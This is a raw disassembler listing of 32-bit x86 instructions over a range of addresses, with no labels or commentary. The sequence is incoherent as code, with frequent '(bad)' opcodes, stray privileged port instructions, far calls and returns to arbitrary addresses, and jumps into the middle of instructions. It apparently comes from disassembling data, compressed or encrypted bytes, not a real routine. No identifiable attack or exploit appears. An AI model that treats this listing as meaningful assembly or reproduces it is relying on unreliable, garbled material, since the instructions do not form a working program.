  41d0c9:	call   0x3a7afd85
  41d0ce:	dec    eax
  41d0cf:	mov    eax,ebx
  41d0d1:	xor    ebx,DWORD PTR [ebx-0x2a3d5f37]
  41d0d7:	sbb    eax,0xd4e1a443
  41d0dc:	ret    
  41d0dd:	push   esp
  41d0de:	push   ds
  41d0df:	ja     0x41d0cb
  41d0e1:	mov    eax,ds:0x96fb5206
  41d0e6:	popa   
  41d0e7:	outs   dx,DWORD PTR ds:[esi]
  41d0e8:	mov    bl,0x25
  41d0ea:	inc    ebp
  41d0eb:	add    BYTE PTR [edi+0x1c],0xf1
  41d0ef:	or     esp,DWORD PTR [edx+ebp*4+0x49a35b5e]
  41d0f6:	mov    ah,0x73
  41d0f8:	sub    al,0xc1
  41d0fa:	fimul  WORD PTR [ecx-0x24325384]
  41d100:	xor    BYTE PTR [esi-0x2b],ah
  41d103:	jp     0x41d126
  41d105:	repnz and al,0x65
  41d108:	outs   dx,BYTE PTR ds:[esi]
  41d109:	and    cl,cl
  41d10b:	fdivr  DWORD PTR [ecx]
  41d10d:	and    ah,0xef
  41d110:	ds pushf 
  41d112:	xor    ch,BYTE PTR [eax]
  41d114:	xor    ebx,DWORD PTR [ecx]
  41d116:	and    ah,BYTE PTR [esi-0x2c]
  41d119:	in     eax,dx
  41d11a:	mov    DWORD PTR [esi],edx
  41d11c:	xor    al,0xb8
  41d11e:	mov    edi,0x4779379c
  41d123:	pop    eax
  41d124:	mov    ds:0xef0362bb,eax
  41d129:	retf   0x9fc9
  41d12c:	das    
  41d12d:	pop    esp
  41d12e:	sbb    eax,DWORD PTR [ebp+0xa]
  41d131:	jno    0x41d0d2
  41d133:	retf   0xe8ad
  41d136:	es sbb al,0xb7
  41d139:	out    dx,al
  41d13a:	fcmovbe st,st(5)
  41d13c:	cs cmc 
  41d13e:	push   esp
  41d13f:	mov    esp,0xe59a14c2
  41d144:	das    
  41d145:	jae    0x41d164
  41d147:	scas   al,BYTE PTR es:[edi]
  41d148:	(bad)  
  41d149:	xchg   edi,eax
  41d14a:	xor    edi,DWORD PTR [ecx+0x73]
  41d14d:	add    edx,ebx
  41d14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d150:	cli    
  41d151:	jecxz  0x41d1b5
  41d153:	jb     0x41d14d
  41d155:	mov    DWORD PTR [ebx],ecx
  41d157:	pop    esi
  41d158:	gs ds ds mov dl,bl
  41d15d:	imul   ebp,DWORD PTR [esi*4-0x6a868c2a],0xffffffdb
  41d165:	shl    BYTE PTR [ebx+ecx*2+0x74],cl
  41d169:	retf   
  41d16a:	js     0x41d133
  41d16c:	popf   
  41d16d:	mov    esi,0x45c0e693
  41d172:	retf   
  41d173:	sbb    DWORD PTR [esi-0x65],esp
  41d176:	in     al,dx
  41d177:	out    0x7b,al
  41d179:	dec    edi
  41d17a:	cli    
  41d17b:	les    edi,FWORD PTR [ebp-0x42]
  41d17e:	xchg   ecx,eax
  41d17f:	inc    ecx
  41d180:	clc    
  41d181:	inc    esp
  41d182:	pop    ecx
  41d183:	mov    eax,0xf296457b
  41d188:	xchg   ebx,eax
  41d189:	mov    ch,0x1c
  41d18b:	dec    ebp
  41d18c:	or     edx,DWORD PTR es:[ecx]
  41d18f:	fcomp  QWORD PTR [eax-0x28484a03]
  41d195:	fcomi  st,st(5)
  41d197:	scas   eax,DWORD PTR es:[edi]
  41d198:	scas   al,BYTE PTR es:[edi]
  41d199:	pop    edx
  41d19a:	std    
  41d19b:	push   cs
  41d19c:	out    dx,eax
  41d19d:	sub    edx,ebp
  41d19f:	pop    ds
  41d1a0:	adc    bl,BYTE PTR [ebp*1+0x7a79fe5f]
  41d1a7:	sbb    esi,edx
  41d1a9:	sub    DWORD PTR [esi+0x1bac40d0],ebp
  41d1af:	push   0x37
  41d1b1:	push   ss
  41d1b2:	xor    eax,0xb5ecc4f8
  41d1b7:	cmc    
  41d1b8:	xchg   ebp,eax
  41d1b9:	mov    dh,0x80
  41d1bb:	push   ss
  41d1bc:	dec    edi
  41d1bd:	and    BYTE PTR ds:0x7a345bea,ch
  41d1c3:	push   cs
  41d1c4:	scas   eax,DWORD PTR es:[edi]
  41d1c5:	add    esp,DWORD PTR ds:0xe50c741f
  41d1cb:	out    0x6c,al
  41d1cd:	and    al,0x88
  41d1cf:	test   al,bh
  41d1d1:	push   es
  41d1d2:	fld    st(7)
  41d1d4:	call   0xe5acba30
  41d1d9:	inc    eax
  41d1da:	(bad)  
  41d1db:	adc    eax,DWORD PTR [esp+edi*2-0x20]
  41d1df:	jp     0x41d1e8
  41d1e1:	sbb    al,0xb0
  41d1e3:	out    dx,eax
  41d1e4:	or     BYTE PTR [edx],dl
  41d1e6:	leave  
  41d1e7:	jb     0x41d239
  41d1e9:	inc    esp
  41d1ea:	fs jb  0x41d22e
  41d1ed:	imul   esi,DWORD PTR [edx+0x35],0xffffffae
  41d1f1:	xchg   esi,eax
  41d1f2:	mov    es,WORD PTR [ecx]
  41d1f4:	ins    BYTE PTR es:[edi],dx
  41d1f5:	fdivr  DWORD PTR [esi-0x383ee03d]
  41d1fb:	mov    BYTE PTR [esi],bh
  41d1fd:	xor    DWORD PTR [eax],ebp
  41d1ff:	rol    BYTE PTR [esi-0x42],cl
  41d202:	retf   
  41d203:	jg     0x41d225
  41d205:	in     eax,dx
  41d206:	mov    bh,0x73
  41d208:	pop    edi
  41d209:	jl     0x41d18d
  41d20b:	xchg   BYTE PTR [esi+0x57],ah
  41d20e:	mov    ebp,DWORD PTR [esi-0x1c780111]
  41d214:	inc    edi
  41d215:	test   eax,0x6f7f18bc
  41d21a:	pause  
  41d21c:	adc    eax,0x39a7e39b
  41d221:	xchg   ebx,eax
  41d222:	stos   DWORD PTR es:[edi],eax
  41d223:	(bad)  
  41d224:	out    dx,al
  41d225:	ss in  al,dx
  41d227:	ret    
  41d228:	popa   
  41d229:	dec    ecx
  41d22a:	cmp    esp,eax
  41d22c:	arpl   WORD PTR [edx+0x34],dx
  41d22f:	jb     0x41d284
  41d231:	std    
  41d232:	pop    ebx
  41d233:	adc    bh,bl
  41d235:	mov    al,ds:0x60eb60e4
  41d23a:	jne    0x41d237
  41d23c:	push   ecx
  41d23d:	pushw  0x15a4
  41d241:	fmul   st,st(0)
  41d243:	xchg   DWORD PTR [esi],esi
  41d245:	mov    dh,0x58
  41d247:	gs inc esp
  41d249:	cmp    edx,edi
  41d24b:	mov    bl,0xc5
  41d24d:	ins    DWORD PTR es:[edi],dx
  41d24e:	and    eax,0xddae9617
  41d253:	stos   DWORD PTR es:[edi],eax
  41d254:	add    al,0xe3
  41d256:	in     eax,0x8f
  41d258:	out    dx,eax
  41d259:	and    BYTE PTR [ecx-0x15c15312],ch
  41d25f:	sub    eax,0x93a36ab7
  41d264:	fnsave [esi]
  41d266:	mov    DWORD PTR [ebx+0x1cca5059],ebp
  41d26c:	or     al,0x73
  41d26e:	int    0x3c
  41d270:	fisttp DWORD PTR [edi]
  41d272:	dec    edx
  41d273:	lock dec ebp
  41d275:	in     al,dx
  41d276:	or     eax,0x9e57d7e2
  41d27b:	in     al,0x1
  41d27d:	lods   eax,DWORD PTR ds:[esi]
  41d27e:	inc    ebx
  41d27f:	aaa    
  41d280:	fst    QWORD PTR ds:0x9ddde958
  41d286:	or     DWORD PTR [edi-0x280b2213],esi
  41d28c:	add    al,0xb9
  41d28e:	js     0x41d27e
  41d290:	dec    eax
  41d291:	push   0xffffffae
  41d293:	pop    esp
  41d294:	jns    0x41d2bc
  41d296:	nop
  41d297:	sbb    esi,DWORD PTR [edx]
  41d299:	push   edi
  41d29a:	(bad)  
  41d29b:	mov    ebx,0xfc828e28
  41d2a0:	xchg   esp,eax
  41d2a1:	and    cl,BYTE PTR [esi+0x54]
  41d2a4:	mov    ebp,0xe7de7fcc
  41d2a9:	or     bh,BYTE PTR [esi+0x51]
  41d2ac:	pop    ebx
  41d2ad:	iret   
  41d2ae:	fbstp  TBYTE PTR [ebx-0x19fb50e7]
  41d2b4:	ror    BYTE PTR [edi],0x33
  41d2b7:	lock das 
  41d2b9:	mov    eax,ds:0x34d7c5df
  41d2be:	push   esi
  41d2bf:	mov    BYTE PTR [ebx],0x37
  41d2c2:	dec    edx
  41d2c3:	cdq    
  41d2c4:	sbb    dl,dl
  41d2c6:	mov    ecx,0x81783da9
  41d2cb:	ds test esi,ecx
  41d2ce:	call   DWORD PTR [ebx-0x7f]
  41d2d1:	pop    ss
  41d2d2:	jecxz  0x41d2f5
  41d2d4:	mov    ecx,0x2844be5a
  41d2d9:	jmp    0xa1d30a60
  41d2de:	cwde   
  41d2df:	pushf  
  41d2e0:	(bad)  
  41d2e1:	mov    edi,0x5547b40a
  41d2e6:	(bad)  
  41d2e7:	shl    DWORD PTR [eax-0x5472df68],cl
  41d2ed:	int    0x75
  41d2ef:	xchg   edi,eax
  41d2f0:	das    
  41d2f1:	push   ecx
  41d2f2:	inc    ecx
  41d2f3:	pop    edx
  41d2f4:	sahf   
  41d2f5:	test   dl,0x6c
  41d2f8:	hlt    
  41d2f9:	jp     0x41d28f
  41d2fb:	popa   
  41d2fc:	clc    
  41d2fd:	maskmovq mm5,(bad)
  41d2fe:	imul   DWORD PTR [esi]
  41d300:	pop    ds
  41d301:	and    eax,0x9e16edd3
  41d306:	cs add bl,dl
  41d309:	sub    ebx,edx
  41d30b:	xchg   esp,eax
  41d30c:	call   0x28bb8414
  41d311:	into   
  41d312:	cmp    dh,BYTE PTR [ebx-0x61f988c4]
  41d318:	call   0xba1a:0x3ebfbbad
  41d31f:	mov    eax,0xa357979e
  41d324:	fucomi st,st(3)
  41d326:	popf   
  41d327:	mov    ebx,0xa2014dfb
  41d32c:	test   BYTE PTR fs:[edx],dh
  41d32f:	popf   
  41d330:	jae    0x41d362
  41d332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d333:	xchg   ecx,eax
  41d334:	xchg   ecx,eax
  41d335:	(bad)  [ebp-0x52e8f377]
  41d33b:	mov    ds:0x607cc95b,eax
  41d340:	addr16 das 
  41d342:	sbb    al,0xbf
  41d344:	(bad)
  41d349:	cdq    
  41d34a:	add    edx,esi
  41d34c:	dec    ecx
  41d34d:	lods   eax,DWORD PTR ds:[esi]
  41d34e:	je     0x41d35d
  41d350:	scas   eax,DWORD PTR es:[edi]
  41d351:	out    dx,eax
  41d352:	mov    DWORD PTR [edi],ecx
  41d354:	repz fisubr DWORD PTR [ecx]
  41d357:	mov    DWORD PTR [edx+0x22],ecx
  41d35a:	mov    WORD PTR [edx+0xdbc67fe],ss
  41d360:	iret   
  41d361:	mov    dl,0xf9
  41d363:	mov    ah,0x45
  41d365:	adc    ebp,DWORD PTR [ecx]
  41d367:	imul   DWORD PTR fs:[bx+si+0x32]
  41d36c:	mov    ds:0x38bf4825,al
  41d371:	ret    0xbb2b
  41d374:	pop    ebx
  41d375:	stc    
  41d376:	subps  xmm0,XMMWORD PTR [ebp+ebp*4+0x30ab9f53]
  41d37e:	sti    
  41d37f:	xchg   edi,eax
  41d380:	mov    edi,0x930b60ce
  41d385:	jb     0x41d378
  41d387:	pop    ebp
  41d388:	cmp    eax,0xf93d9294
  41d38d:	dec    ecx
  41d38e:	(bad)  
  41d38f:	aas    
  41d390:	in     al,dx
  41d391:	and    DWORD PTR [eax+ebx*4-0x2b43fe1a],edx
  41d398:	push   DWORD PTR [ebx-0xc]
  41d39b:	xchg   esi,eax
  41d39c:	popf   
  41d39d:	mov    dh,0x30
  41d39f:	shl    DWORD PTR [eax],cl
  41d3a1:	sub    edi,DWORD PTR [edi-0x25fa9fb2]
  41d3a7:	sub    al,0x32
  41d3a9:	in     eax,0x56
  41d3ab:	in     al,0x8a
  41d3ad:	add    edi,eax
  41d3af:	push   edi
  41d3b0:	mov    ch,0x3e
  41d3b2:	fs cmp al,0x2f
  41d3b5:	(bad)  
  41d3b6:	adc    BYTE PTR [edx+0x4ea95bb0],al
  41d3bc:	(bad)  
  41d3bf:	or     DWORD PTR [esi+0x55],0x61256634
  41d3c6:	cdq    
  41d3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c8:	or     ah,cl
  41d3ca:	mov    al,ds:0x61862be9
  41d3cf:	push   ds
  41d3d0:	lds    edx,FWORD PTR [edx]
  41d3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d3:	or     BYTE PTR [edx],ah
  41d3d5:	iret   
  41d3d6:	push   eax
  41d3d7:	cld    
  41d3d8:	inc    edi
  41d3d9:	data16 cmc 
  41d3db:	(bad)  
  41d3dc:	out    dx,al
  41d3dd:	das    
  41d3de:	jns    0x41d39e
  41d3e0:	(bad)  
  41d3e1:	stc    
  41d3e2:	jae    0x41d450
  41d3e4:	retf   
  41d3e5:	adc    ecx,ecx
  41d3e7:	lods   eax,DWORD PTR ds:[esi]
  41d3e8:	ret    
  41d3e9:	jl     0x41d3e2
  41d3eb:	ret    0x9d2e
  41d3ee:	and    al,0xf4
  41d3f0:	mov    ?,WORD PTR [edi-0x17d28d99]
  41d3f6:	or     DWORD PTR cs:[edi],edx
  41d3f9:	ret    
  41d3fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3fb:	hlt    
  41d3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3fd:	stos   DWORD PTR es:[edi],eax
  41d3fe:	(bad)  
  41d3ff:	xor    eax,0x874aab23
  41d404:	jne    0x41d41a
  41d406:	int    0x76
  41d408:	das    
  41d409:	out    dx,al
  41d40a:	sub    BYTE PTR [esi+0x62914eb0],bh
  41d410:	inc    edi
  41d411:	mov    edi,0xe894c9dd
  41d416:	das    
  41d417:	and    ch,bh
  41d419:	push   esp
  41d41a:	cli    
  41d41b:	int    0xc5
  41d41d:	cli    
  41d41e:	test   BYTE PTR [ecx-0xed75198],cl
  41d424:	dec    ecx
  41d425:	xchg   ebx,eax
  41d426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d427:	out    0x14,al
  41d429:	xchg   esi,eax
  41d42a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d42b:	clc    
  41d42c:	pushf  
  41d42d:	stos   BYTE PTR es:[edi],al
  41d42e:	push   ebp
  41d42f:	es repz gs jge 0x41d46d
  41d434:	into   
  41d435:	repz std 
  41d437:	test   esi,ebx
  41d439:	retf   
  41d43a:	add    BYTE PTR [eax+0x25],0xa7
  41d43e:	jle    0x41d418
  41d440:	mov    ch,0x6d
  41d442:	mov    DWORD PTR [ebp-0x23],esp
  41d445:	cmc    
  41d446:	push   ds
  41d447:	mov    al,ds:0x1ce767ac
  41d44c:	sbb    eax,0xa26203a8
  41d451:	jge    0x41d4cd
  41d453:	mov    cs,WORD PTR [ebp-0x7]
  41d456:	out    0x0,eax
  41d458:	inc    eax
  41d459:	retf   
  41d45a:	stos   DWORD PTR es:[edi],eax
  41d45b:	lahf   
  41d45c:	ror    BYTE PTR [eax+0x7dd89ba5],0x8
  41d463:	jno    0x41d475
  41d465:	nop
  41d466:	test   al,0xac
  41d468:	inc    edi
  41d469:	loop   0x41d484
  41d46b:	mov    BYTE PTR [esi+0x59],dl
  41d46e:	rol    DWORD PTR ds:0x5f7a7702,cl
  41d474:	cdq    
  41d475:	out    0x49,al
  41d477:	into   
  41d478:	mov    eax,ds:0x54eba8d9
  41d47d:	fucomi st,st(0)
  41d47f:	add    DWORD PTR [ebp-0x15570e11],edi
  41d485:	sar    DWORD PTR [edi+0x1a],1
  41d488:	ret    
  41d489:	jnp    0x41d4c1
  41d48b:	leave  
  41d48c:	out    0xa,eax
  41d48e:	outs   dx,BYTE PTR ds:[esi]
  41d48f:	dec    edx
  41d490:	cmp    dh,bl
  41d492:	aam    0xd3
  41d494:	gs ret 
  41d496:	inc    edx
  41d497:	xor    eax,0x805821b1
  41d49c:	fadd   DWORD PTR [eax]
  41d49e:	sbb    DWORD PTR [eax-0x23],ebx
  41d4a1:	(bad)  
  41d4a2:	pop    ebx
  41d4a3:	add    BYTE PTR [ebx+0x54],ah
  41d4a6:	mov    cl,0xd1
  41d4a8:	popf   
  41d4a9:	imul   ebp,DWORD PTR [esi+0x6e5a30fe],0x3d82c3c4
  41d4b3:	jp     0x41d445
  41d4b5:	jnp    0x41d477
  41d4b7:	ins    BYTE PTR es:[edi],dx
  41d4b8:	and    BYTE PTR [ebp-0x371f4e97],dl
  41d4be:	aad    0x67
  41d4c0:	aam    0x17
  41d4c2:	int    0x4c
  41d4c4:	mov    esp,0xb5cce70a
  41d4c9:	jne    0x41d505
  41d4cb:	test   edi,edx
  41d4cd:	adc    cl,ah
  41d4cf:	sahf   
  41d4d0:	dec    edi
  41d4d1:	push   edi
  41d4d2:	lods   al,BYTE PTR ds:[esi]
  41d4d3:	fucomip st,st(2)
  41d4d5:	daa    
  41d4d6:	sub    dh,BYTE PTR [eax-0x10d9cb85]
  41d4dc:	fstp   TBYTE PTR [ebx-0x20]
  41d4df:	jne    0x41d4c8
  41d4e1:	mov    ch,0x3c
  41d4e3:	pusha  
  41d4e4:	iret   
  41d4e5:	test   eax,0xb222510e
  41d4ea:	push   esi
  41d4eb:	push   edx
  41d4ec:	in     al,0x8
  41d4ee:	adc    ebx,esi
  41d4f0:	ds in  eax,0xdb
  41d4f3:	pop    esp
  41d4f4:	add    DWORD PTR [esi+0x151c31af],ecx
  41d4fa:	add    BYTE PTR [ebp-0x7a],bh
  41d4fd:	arpl   sp,bp
  41d4ff:	and    al,0x62
  41d501:	cdq    
  41d502:	retf   
  41d503:	fldcw  WORD PTR [edi]
  41d505:	retf   0xe2e9
  41d508:	jl     0x41d565
  41d50a:	sbb    al,0x8e
  41d50c:	dec    ebx
  41d50d:	and    DWORD PTR [ecx-0x53b4f72a],edi
  41d513:	or     al,0x27
  41d515:	mov    edx,0x96273a70
  41d51a:	inc    edx
  41d51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d51c:	pop    ds
  41d51d:	pop    DWORD PTR [esi]
  41d51f:	arpl   WORD PTR [ebx],dx
  41d521:	add    BYTE PTR ds:0xaa7325bb,cl
  41d527:	arpl   WORD PTR ds:0x39806985,si
  41d52d:	les    esp,FWORD PTR [ebx+0x7608f5fd]
  41d533:	gs lock (bad) 
  41d536:	out    dx,al
  41d537:	jne    0x41d58d
  41d539:	aas    
  41d53a:	(bad)  
  41d53b:	scas   eax,DWORD PTR es:[di]
  41d53d:	cdq    
  41d53e:	mov    dl,BYTE PTR [edx-0x13]
  41d541:	push   ebp
  41d542:	rol    bh,0xfe
  41d545:	dec    esp
  41d546:	and    DWORD PTR [ebp+esi*4+0x3c],ebp
  41d54a:	xchg   esp,eax
  41d54b:	popf   
  41d54c:	cmp    esp,DWORD PTR [edi-0x45]
  41d54f:	es retf 
  41d551:	mov    ebx,0xb58c9413
  41d556:	in     eax,dx
  41d557:	jmp    0xec70799c
  41d55c:	mov    WORD PTR [esi+0x76],ds
  41d55f:	pop    esi
  41d560:	pop    eax
  41d561:	ins    DWORD PTR es:[edi],dx
  41d562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d563:	es (bad) 
  41d565:	fbstp  TBYTE PTR [edx]
  41d567:	fidivr WORD PTR ds:0x63ba1f8c
  41d56d:	or     edx,ebp
  41d56f:	jecxz  0x41d52e
  41d571:	xor    ebx,esi
  41d573:	aas    
  41d574:	call   0xe505:0x1a80bdf7
  41d57b:	loop   0x41d51c
  41d57d:	mov    esp,edx
  41d57f:	or     ecx,DWORD PTR [ebx]
  41d581:	jp     0x41d589
  41d583:	ins    DWORD PTR es:[edi],dx
  41d584:	rol    DWORD PTR [ecx+edi*2+0x1535267e],cl
  41d58b:	add    ch,BYTE PTR es:[ebx-0x3c91b402]
  41d592:	js     0x41d54d
  41d594:	aaa    
  41d595:	mov    DWORD PTR ds:0xccfc,ebp
  41d59a:	mov    dh,0xfd
  41d59c:	ja     0x41d525
  41d59e:	xor    ecx,DWORD PTR [esi]
  41d5a0:	sub    eax,0x8cc925d2
  41d5a5:	xor    al,0x16
  41d5a7:	sbb    BYTE PTR [ebx],ch
  41d5a9:	aam    0xc2
  41d5ab:	add    al,BYTE PTR [esi+ecx*1+0x65]
  41d5af:	(bad)  
  41d5b0:	fdivr  st(3),st
  41d5b2:	dec    eax
  41d5b3:	scas   eax,DWORD PTR es:[edi]
  41d5b4:	dec    eax
  41d5b5:	fild   DWORD PTR [edi+eax*2+0x10]
  41d5b9:	in     eax,0x2
  41d5bb:	adc    DWORD PTR [edi],0xaacfa90a
  41d5c1:	mov    ah,0x70
  41d5c3:	call   0xc70c:0xefcd1b86
  41d5ca:	ja     0x41d561
  41d5cc:	sti    
  41d5cd:	sub    esp,DWORD PTR [ecx]
  41d5cf:	xor    eax,0xe97b175b
  41d5d4:	push   0x4951f0be
  41d5d9:	adc    al,0x4f
  41d5db:	nop
  41d5dc:	hlt    
  41d5dd:	mov    ch,0xe2
  41d5df:	ret    
  41d5e0:	xor    ebp,DWORD PTR [eax]
  41d5e2:	outs   dx,BYTE PTR ds:[esi]
  41d5e3:	test   al,0xfb
  41d5e5:	mov    ebp,?
  41d5e7:	sbb    ebx,DWORD PTR [ebp-0x43d483e2]
  41d5ed:	cwde   
  41d5ee:	ds (bad) 
  41d5f0:	sbb    BYTE PTR [edi-0x33d1592a],0xeb
  41d5f7:	dec    esi
  41d5f8:	das    
  41d5f9:	cdq    
  41d5fa:	xchg   edi,eax
  41d5fb:	ja     0x41d62e
  41d5fd:	test   eax,0x3eea4121
  41d602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d603:	add    BYTE PTR [ebx-0x350f03d5],0xfe
  41d60a:	add    eax,0x9fd39f8
  41d60f:	mov    ecx,0xa166f143
  41d614:	aaa    
  41d615:	add    al,0x91
  41d617:	icebp  
  41d618:	test   eax,0x3d82072b
  41d61d:	not    DWORD PTR [edx]
  41d61f:	popa   
  41d620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d621:	mov    eax,ds:0x88c88e91
  41d626:	mov    al,0x40
  41d628:	pop    ss
  41d629:	sbb    BYTE PTR [edi-0x42],al
  41d62c:	xor    DWORD PTR [esi+0x48466df8],eax
  41d632:	sub    dl,BYTE PTR ss:[ebx]
  41d635:	pop    es
  41d636:	popa   
  41d637:	(bad)  
  41d638:	addr16 idiv bh
  41d63b:	test   eax,0x2aa3655d
  41d640:	dec    ecx
  41d641:	and    esi,ebx
  41d643:	adc    dh,BYTE PTR [esi+0x7f]
  41d646:	push   ebx
  41d647:	into   
  41d648:	aam    0xa7
  41d64a:	jo     0x41d6c3
  41d64c:	jcxz   0x41d691
  41d64f:	adc    BYTE PTR [edx-0x5822e373],dh
  41d655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d656:	ror    DWORD PTR [ebx-0xf],cl
  41d659:	or     eax,0xc7868100
  41d65e:	xchg   edx,eax
  41d65f:	mov    eax,ds:0xcc4c44ce
  41d664:	mov    al,0x28
  41d666:	stos   BYTE PTR es:[edi],al
  41d667:	push   0xadff67c1
  41d66c:	jae    0x41d63c
  41d66e:	mov    cs,WORD PTR [esp+ebx*4]
  41d671:	enter  0x470c,0x88
  41d675:	mov    ebx,0x7eb74a2a
  41d67a:	adc    al,ah
  41d67c:	mov    ah,0xe8
  41d67e:	movntq QWORD PTR [edx+ecx*1+0x7c],mm5
  41d683:	or     DWORD PTR [ebp+0x43],edx
  41d686:	ins    DWORD PTR es:[edi],dx
  41d687:	jge    0x41d704
  41d689:	sti    
  41d68a:	or     edx,0x104199f5
  41d690:	inc    eax
  41d691:	(bad)  
  41d692:	loop   0x41d61f
  41d694:	ret    
  41d695:	inc    ebx
  41d696:	in     al,dx
  41d697:	leave  
  41d698:	ficom  DWORD PTR [esi-0x397616f0]
  41d69e:	xor    DWORD PTR [ebx-0x5f],ebp
  41d6a1:	loop   0x41d624
  41d6a3:	in     al,0x80
  41d6a5:	and    edx,DWORD PTR [ecx]
  41d6a7:	push   ebp
  41d6a8:	sbb    dh,dh
  41d6aa:	scas   al,BYTE PTR es:[edi]
  41d6ab:	xchg   edi,eax
  41d6ac:	das    
  41d6ad:	iret   
  41d6ae:	ins    BYTE PTR es:[edi],dx
  41d6af:	aaa    
  41d6b0:	fidiv  WORD PTR [eax]
  41d6b2:	outs   dx,BYTE PTR ds:[esi]
  41d6b3:	(bad)  
  41d6b4:	push   0xffffffe0
  41d6b6:	sbb    eax,0x369529fa
  41d6bb:	sbb    dh,ch
  41d6bd:	mov    DWORD PTR [eax-0x38],edx
  41d6c0:	popa   
  41d6c1:	(bad)  
  41d6c2:	pop    edx
  41d6c3:	add    ch,BYTE PTR [edx]
  41d6c5:	ins    DWORD PTR es:[di],dx
  41d6c7:	dec    edx
  41d6c8:	xchg   ebp,eax
  41d6c9:	lods   eax,DWORD PTR ds:[esi]
  41d6ca:	jae    0x41d6f7
  41d6cc:	adc    BYTE PTR [ebx],al
  41d6ce:	mov    ebx,0x20c99021
  41d6d3:	gs out dx,al
  41d6d5:	inc    ebp
  41d6d6:	xchg   edx,eax
  41d6d7:	pop    es
  41d6d8:	or     dl,ah
  41d6da:	mov    edi,0xb017b049
  41d6df:	sbb    bl,BYTE PTR ds:0x5896620
  41d6e5:	fsubr  QWORD PTR ds:0x4d7298b8
  41d6eb:	nop
  41d6ec:	popf   
  41d6ed:	inc    DWORD PTR [esi+0x6f31bc50]
  41d6f3:	jge    0x41d770
  41d6f5:	cmp    al,0xc1
  41d6f7:	mov    dh,0xdf
  41d6f9:	daa    
  41d6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6fb:	pusha  
  41d6fc:	jbe    0x41d688
  41d6fe:	adc    ch,BYTE PTR [ebx]
  41d700:	ins    DWORD PTR es:[edi],dx
  41d701:	not    bh
  41d703:	pop    ebx
  41d704:	repnz in eax,0x92
  41d707:	mov    ds:0x98d5d9e3,eax
  41d70c:	mov    edx,0xde7a66f8
  41d711:	adc    dh,BYTE PTR [ecx]
  41d713:	mov    ss:0xcb15043d,al
  41d719:	(bad)  
  41d71a:	mov    esi,0xaa4af0cc
  41d71f:	xchg   edi,eax
  41d720:	ret    
  41d721:	and    al,0xa
  41d723:	lods   eax,DWORD PTR ds:[esi]
  41d724:	xor    eax,0xdc329d50
  41d729:	fdivr  DWORD PTR [edx]
  41d72b:	data16 shr BYTE PTR [ebx*1-0x7aca145b],1
  41d733:	fwait
  41d734:	add    al,cl
  41d736:	cmp    edx,esi
  41d738:	mov    bh,ch
  41d73a:	jbe    0x41d724
  41d73c:	loope  0x41d760
  41d73e:	cld    
  41d73f:	pop    ebp
  41d740:	dec    ebx
  41d741:	shr    esi,1
  41d743:	gs pop esi
  41d745:	outs   dx,BYTE PTR ds:[esi]
  41d746:	jge    0x41d6e8
  41d748:	mov    ebx,ebx
  41d74a:	rcl    BYTE PTR [edx],0xee
  41d74d:	js     0x41d75d
  41d74f:	pop    edi
  41d750:	into   
  41d751:	jmp    0x41d769
  41d753:	sar    DWORD PTR [edi+esi*1+0x63620366],0xfd
  41d75b:	nop
  41d75c:	xor    al,bh
  41d75e:	jl     0x41d6fa
  41d760:	lods   al,BYTE PTR ds:[esi]
  41d761:	dec    edx
  41d762:	mov    ebp,eax
  41d764:	in     eax,0xf7
  41d766:	mov    edi,0xa5becfa4
  41d76b:	loopne 0x41d7ac
  41d76d:	into   
  41d76e:	or     edx,edx
  41d770:	mov    bh,0x67
  41d772:	and    eax,0xf16b87a1
  41d777:	stos   BYTE PTR es:[edi],al
  41d778:	psubsb mm1,mm2
  41d77b:	loopne 0x41d733
  41d77d:	int    0xc3
  41d77f:	add    eax,0x32e9cd8
  41d784:	retf   
  41d785:	push   ebp
  41d786:	sti    
  41d787:	les    edi,FWORD PTR [di-0x4440]
  41d78c:	shr    DWORD PTR [eax+ecx*4-0x1cbd8d27],1
  41d793:	std    
  41d794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d795:	pop    esi
  41d796:	add    al,0x8b
  41d798:	fwait
  41d799:	xchg   ebp,eax
  41d79a:	hlt    
  41d79b:	iret   
  41d79c:	call   0xfa4e:0x658b907a
  41d7a3:	sub    BYTE PTR [esi-0x4f1359c5],dl
  41d7a9:	mov    ch,0x88
  41d7ab:	sar    DWORD PTR [edx],cl
  41d7ad:	outs   dx,BYTE PTR fs:[esi]
  41d7af:	ret    
  41d7b0:	ss iret 
  41d7b2:	xor    DWORD PTR [edx],esi
  41d7b4:	cmp    eax,0x90b29790
  41d7b9:	jl     0x41d7f0
  41d7bb:	loope  0x41d7c6
  41d7bd:	mov    edi,ecx
  41d7bf:	cmp    cl,BYTE PTR [ecx]
  41d7c1:	sahf   
  41d7c2:	mov    BYTE PTR [esi],ch
  41d7c4:	scas   al,BYTE PTR es:[edi]
  41d7c5:	lods   eax,DWORD PTR ds:[esi]
  41d7c6:	push   ecx
  41d7c7:	and    edx,DWORD PTR [eax+0x36]
  41d7ca:	out    0xd,al
  41d7cc:	shr    DWORD PTR [eax+0x5563288a],cl
  41d7d2:	pshufw mm0,QWORD PTR [esi+edi*4-0x5e221e2a],0x48
  41d7db:	lahf   
  41d7dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7dd:	mov    eax,0x91b70c40
  41d7e2:	out    0xa0,al
  41d7e4:	xchg   ecx,eax
  41d7e5:	sub    al,0x61
  41d7e7:	push   ebx
  41d7e8:	jmp    0xb56c5766
  41d7ed:	inc    ebx
  41d7ee:	(bad)  
  41d7ef:	sub    ch,BYTE PTR [edx+0x54a62c93]
  41d7f5:	and    DWORD PTR [esi-0x41166bef],ecx
  41d7fb:	pop    ds
  41d7fc:	test   ah,ch
